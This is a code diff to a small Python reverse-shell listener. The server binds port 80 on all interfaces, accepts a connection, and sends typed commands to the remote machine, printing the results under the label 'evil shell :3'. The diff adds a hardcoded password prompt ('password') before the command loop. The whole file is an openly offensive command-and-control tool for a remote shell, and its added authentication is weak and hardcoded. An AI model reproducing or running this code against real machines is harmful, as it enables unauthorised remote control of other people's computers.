@@ -1,4 +1,5 @@
 import socket
+import crypt
 # the host is 0.0.0.0 : 
 '''
 lcoal host translates into 127.0.0.1 which will always be the IP address of the machine 
@@ -9,6 +10,8 @@ lcoal host translates into 127.0.0.1 which will always be the IP address of the 
 HOST = "0.0.0.0"
 PORT = 80
 BUFFER = 1024
+# USER = ""
+CORRECT_PASS = "password"
 
 
 # server set up
@@ -27,20 +30,35 @@ def main():
     connect, address = sock.accept()
     
     print(f"Connected by {address}")
-    while True:
-        # data = connect.recv(BUFFER).decode("UTF-8")
-        command = input("$ ")
-        if command == "":
+    # authentication
+    # username = input("Input your username: ")
+    password = input("Input your password: ")
+    incorrect_count = 0
+    while password != CORRECT_PASS:
+        incorrect_count += 1
+        password = input("Incorrect password. Please try again: ")
+        if incorrect_count == 3:
             break
-        print("$ sending command")
-        connect.send(command.encode())
-        output = connect.recv(BUFFER).decode("UTF-8")
-        print("$ evil shell :3 > **********print results: ")
-        print(output)
-        
-        
-    print("closing connection")
-    connect.close()
+
+    if incorrect_count == 3:
+        print("Incorrect password. Closing connection")
+        connect.close()
+
+    else: 
+        while True:
+            # data = connect.recv(BUFFER).decode("UTF-8")
+            command = input("$ ")
+            if command == "":
+                break
+            print("$ sending command")
+            connect.send(command.encode())
+            output = connect.recv(BUFFER).decode("UTF-8")
+            print("$ evil shell :3 > **********print results: ")
+            print(output)
+            
+            
+        print("closing connection")
+        connect.close()
 
         
 
